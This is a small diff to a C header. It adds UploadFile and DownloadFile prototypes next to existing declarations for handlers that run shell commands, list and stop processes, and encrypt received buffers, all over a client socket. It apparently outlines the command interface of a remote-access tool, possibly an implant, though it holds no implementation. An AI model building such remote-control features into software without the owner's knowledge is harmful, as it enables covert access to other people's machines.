@@ -6,3 +6,5 @@ void encrypt(unsigned char* recv_buf, size_t recv_buf_size);
 void HandleLspid(char *cmd, int client_socket);
 void HandleShell(char *cmd,int client_socket);
 void HandleStopProcess(char *cmd, int client_socket);
+int UploadFile(char *cmd ,int client_socket, char * filename,  char * FullWindowsPath);
+int DownloadFile(char *cmd, int client_socket, char * filename);
